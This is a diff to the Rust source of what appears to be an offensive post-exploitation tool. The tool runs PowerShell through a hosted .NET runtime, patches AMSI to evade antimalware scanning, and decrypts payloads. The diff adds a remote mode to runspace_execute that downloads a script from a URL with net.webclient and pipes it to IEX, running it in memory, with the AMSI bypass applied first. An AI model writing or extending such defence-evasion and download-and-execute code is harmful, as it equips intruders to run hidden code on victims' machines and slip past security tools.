@@ -444,100 +444,85 @@ fn aes_decrypt(encrypted_data: &[u8],key: &[u8],iv: &[u8]) -> Result<Vec<u8>, sy
     Ok(final_result)
 }
 
-unsafe fn runspace_execute(command: &str) -> Result<String, String> {
-    
+unsafe fn runspace_execute(command: &str, is_remote: bool) -> Result<String, String> {
     // Initialize the CLR
-    let mut clr = Clr::context_only(None)?;
-    let context = clr.get_context()?;
+    let mut clr = Clr::context_only(None).map_err(|e| e.to_string())?;
+    let context = clr.get_context().map_err(|e| e.to_string())?;
     let app_domain = context.app_domain;
-    let mscorlib = (*app_domain).load_library("mscorlib")?;
+    let mscorlib = (*app_domain).load_library("mscorlib").map_err(|e| e.to_string())?;
 
     // Load the 'System.Management.Automation' assembly
-    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly")?;
+    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly").map_err(|e| e.to_string())?;
     let assembly_load_with_partial_name_fn = (*assembly_type).get_method_with_signature(
         "System.Reflection.Assembly LoadWithPartialName(System.String)",
-    )?;
+    ).map_err(|e| e.to_string())?;
     let automation_variant = (*assembly_load_with_partial_name_fn).invoke(
-        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")])?,
+        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")]).map_err(|e| e.to_string())?,
         None,
-    )?;
-    let automation =
-        automation_variant.Anonymous.Anonymous.Anonymous.byref as *mut _ as *mut _Assembly;
+    ).map_err(|e| e.to_string())?;
+    let automation = automation_variant.Anonymous.Anonymous.Anonymous.byref as *mut _ as *mut _Assembly;
 
     // Get types
-    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject")?;
-    let runspace_factory_type =
-        (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory")?;
-    let runspace_pipeline_commands_type =
-        (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection")?;
+    let runspace_factory_type = (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory").map_err(|e| e.to_string())?;
+    let runspace_type = (*automation).get_type("System.Management.Automation.Runspaces.Runspace").map_err(|e| e.to_string())?;
+    let runspace_pipeline_type = (*automation).get_type("System.Management.Automation.Runspaces.Pipeline").map_err(|e| e.to_string())?;
+    let runspace_pipeline_commands_type = (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection").map_err(|e| e.to_string())?;
     let runspace_pipeline_reader_type = (*automation).get_type(
         "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject]"
-    )?;
-    let runspace_pipeline_type =
-        (*automation).get_type("System.Management.Automation.Runspaces.Pipeline")?;
-    let runspace_type =
-        (*automation).get_type("System.Management.Automation.Runspaces.Runspace")?;
+    ).map_err(|e| e.to_string())?;
+    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject").map_err(|e| e.to_string())?;
 
     // Get functions
-    let commands_addscript_fn = (*runspace_pipeline_commands_type)
-        .get_method_with_signature("Void AddScript(System.String)")?;
-    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
-        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
-    )?;
-    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
-        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
-    )?;
-
-    let pipeline_invoke_async_fn =
-        (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()")?;
-    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
-        .get_method_with_signature("System.Management.Automation.PSObject Read()")?;
-    let psobject_tostring_fn =
-        (*psobject_type).get_method_with_signature("System.String ToString()")?;
     let runspace_create_fn = (*runspace_factory_type).get_method_with_signature(
         "System.Management.Automation.Runspaces.Runspace CreateRunspace()",
-    )?;
+    ).map_err(|e| e.to_string())?;
+    let runspace_open_fn = (*runspace_type).get_method("Open").map_err(|e| e.to_string())?;
     let runspace_dispose_fn = (*runspace_type).get_method("Dispose")?;
-    let runspace_open_fn = (*runspace_type).get_method("Open")?;
 
-    // Create the runspace and pipeline
-    let runspace = (*runspace_create_fn).invoke_without_args(None)?;
-    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone()))?;
+    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
+        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
+    ).map_err(|e| e.to_string())?;
+    let commands_addscript_fn = (*runspace_pipeline_commands_type)
+        .get_method_with_signature("Void AddScript(System.String)").map_err(|e| e.to_string())?;
+    let pipeline_invoke_async_fn = (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()").map_err(|e| e.to_string())?;
+    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
+        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
+    ).map_err(|e| e.to_string())?;
+    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
+        .get_method_with_signature("System.Management.Automation.PSObject Read()").map_err(|e| e.to_string())?;
+    let psobject_tostring_fn = (*psobject_type).get_method_with_signature("System.String ToString()").map_err(|e| e.to_string())?;
 
+    // Create and open the runspace
+    let runspace = (*runspace_create_fn).invoke_without_args(None).map_err(|e| e.to_string())?;
+    (*runspace_open_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;
 
+    // Create the pipeline and add the command
+    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;
+    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands").map_err(|e| e.to_string())?;
+    let commands_collection = (*pipeline_commands_property).get_value(Some(pipeline.clone())).map_err(|e| e.to_string())?;
 
-    // Open the runspace
-    (*runspace_open_fn).invoke_without_args(Some(runspace.clone()))?;
+    let script_command = if is_remote {
+        format!("(new-object net.webclient).downloadstring('{}') | IEX | Out-String", command)
+    } else {
+        format!("{} | Out-String", command)
+    };
 
-    // Access the pipeline commands property, and add our script
-    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands")?;
-    let commands_collection = (*pipeline_commands_property).get_value(Some(pipeline.clone()))?;
     (*commands_addscript_fn).invoke(
         wrap_method_arguments(vec![wrap_string_in_variant(
-            format!("{} | Out-String", command).as_str(),
-        )])?,
+            script_command.as_str(),
+        )]).map_err(|e| e.to_string())?,
         Some(commands_collection),
-    )?;
+    ).map_err(|e| e.to_string())?;
 
-    // Invoke the pipeline asynchronously
-    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone()))?;
-
-    // Read the output
-    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone()))?;
-    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone()))?;
-    let reader_read_tostring =
-        (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone()))?;
-    let output = reader_read_tostring
-        .Anonymous
-        .Anonymous
-        .Anonymous
-        .bstrVal
-        .to_string();
-
+    // Execute the pipeline and read the output
+    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
+    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
+    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone())).map_err(|e| e.to_string())?;
+    let reader_read_tostring = (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone())).map_err(|e| e.to_string())?;
     // Clean up the runspace
     (*runspace_dispose_fn).invoke_without_args(Some(runspace.clone()))?;
+    Ok(reader_read_tostring.Anonymous.Anonymous.Anonymous.bstrVal.to_string())
 
-    Ok(output)
 }
 
 
@@ -932,17 +917,25 @@ pub fn execute_clr_mode(args: Vec<String>, base: Option<String>, key: Option<Str
 
 pub fn execute_ps_mode(command: Option<String>, script: Option<String>) -> Result<(), String> {
     setup_bypass()?;
-    patch_amsi();
+    
     if let Some(cmd) = command {
         // Execute the PowerShell command
-        let result = unsafe { runspace_execute(&cmd) };
+        let _ = patch_amsi();
+        let result = unsafe { runspace_execute(&cmd, false) };
         match result {
             Ok(output) => println!("[+] Output:\n{}", output),
             Err(err) => return Err(format!("[!] Error: {}", err)),
         }
-    } else if let Some(script_path_or_url) = script {
-        // Pass the script path or URL directly to runspace_execute_script
-        let result = unsafe { runspace_execute(&script_path_or_url) };
+    } else if let Some(script_path) = script {
+        let _ = patch_amsi();
+        let is_remote = script_path.starts_with("http://") || script_path.starts_with("https://");
+
+        if !is_remote && !Path::new(&script_path).exists() {
+            return Err(format!("Script file '{}' does not exist", script_path));
+        }
+
+        // Pass the script path and is_remote flag to runspace_execute
+        let result = unsafe { runspace_execute(&script_path, is_remote) };
         match result {
             Ok(output) => println!("[+] Output:\n{}", output),
             Err(err) => return Err(format!("[!] Error: {}", err)),
